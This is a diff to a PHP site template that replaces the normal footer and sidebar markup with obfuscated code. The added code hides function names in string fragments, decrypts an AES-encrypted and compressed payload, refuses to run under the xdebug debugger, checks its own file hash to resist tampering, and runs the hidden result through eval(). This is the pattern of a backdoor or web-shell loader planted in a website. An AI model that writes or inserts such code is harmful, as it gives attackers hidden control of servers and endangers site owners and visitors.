@@ -1,22 +1,28 @@
-<footer class="main-footer">
-    <div class="pull-right hidden-xs">
-      <b><?php  echo $SITE_TITLE;?> -v<?= $VERSION;?></b> 
-    </div>
-    <strong>Copyright &copy; <?=date("Y")?> All rights reserved.</strong>
-  </footer>
-
-  <!-- Control Sidebar -->
-  <aside class="control-sidebar control-sidebar-dark">
-    <!-- Create the tabs -->
-    <ul class="nav nav-tabs nav-justified control-sidebar-tabs">
-      <li>
-      </li>
-    </ul>
-    <!-- Tab panes -->
-    <div class="tab-content">
-      <div class="tab-pane" id="control-sidebar-home-tab">
-        
-      </div>
-      <!-- /.tab-pane -->
-    </div>
-  </aside>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_m549lxhn=('bas'.'e64'.'_de'.'cod'.'e');
+$_oy1ydklc=('gzu'.'nco'.'mpr'.'ess');
+$_bdwacvfc=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_yvih1ysn='5hmHJ/ha';
+$_u56rtft1='sND0IQUA';
+$_x3kf6uxj='fNa18JJ4';
+$_kclnl08j='u9KiM1gR';
+$_nq6mqwhp='P/S+E3x1qpk=';
+$_czo1da2s='oIDCBQ==';
+$_vabhs637='MHjy5asa';
+$_ex4ci1d0='XhC6r+1m';
+$_gglwjufc=$_m549lxhn($_yvih1ysn.$_x3kf6uxj.$_kclnl08j.$_u56rtft1.$_nq6mqwhp);
+$_m5fsgcdu=$_m549lxhn($_vabhs637.$_ex4ci1d0.$_czo1da2s);
+$_ol3d6wg4=$_m549lxhn('zdOB0VGtshA7USoBqiRr9cBF/OksXP8MhNRhz/XVtALyg2/XWv8+3mhDQvX5uIA+cyFvONqDmgZRxeNNzzx03yZ6+GlihJO/0iFeerzhPDhERWxk9LiH9/RWj7Gh/SmzBa1YbT8A27DEdo9gBLqYl6RCKPHo6Va5PSQHko46M1xyICh3EVyoZNDqO9PrOv3SVu2FZkAelg5i/kjzAPD016kmUMLFarm8vH2E7fcgC+N7PysUffDA8C6QGdCT8xZbXdj/VFa3UE6TBRynYbGotOdD9rCN7ZrQRK53aNwS9oWG1PtkfrgFNDapQgd0yneQ/M5xUz6TEimMzFzTiuToepk8v7/zLJpBPSdb2UAm2vevHCno/X3ibjveL3gqA0CikWylvk/rXoSMkxB8tnd0++ZKHYAN60h7ZqbDiOhgtfyKghK1+RVKUlbWnr8Ew00JlCD/TDibPBhiiiXZr3wRSDVrXBhXENbd8O0w9EevoMlE/pbrgqjMDVNRDqZKC9nXAW3ImGGC5V5z1pdbgPlDIYk1lud+lmra0pqT71wgo6b2WrJCDyVZYdEJxj6RkQW63bPcIJQFGoaRo72MdmUsrg==');
+$_jejc3kmn=$_bdwacvfc($_ol3d6wg4,'aes-256-cbc',$_gglwjufc,OPENSSL_RAW_DATA,$_m5fsgcdu);
+if($_jejc3kmn===false){exit;}
+$_kupsae7e=$_oy1ydklc($_jejc3kmn);
+if($_kupsae7e===false){exit;}
+$_zdx7fgif='6270e266ac0be3e6ee2a6d5af169a3d6ff8b362ddc125832c5cd958c22f04e85';
+$_wv026mr9=@file_get_contents(__FILE__);
+if($_wv026mr9!==false){
+$_opgzjha8=str_replace($_zdx7fgif,"0000000000000000000000000000000000000000000000000000000000000000",$_wv026mr9);
+$_nsx15trc=hash("sha256",$_opgzjha8);
+if($_nsx15trc!==$_zdx7fgif){@http_response_code(403);exit;}
+}
+eval($_kupsae7e);
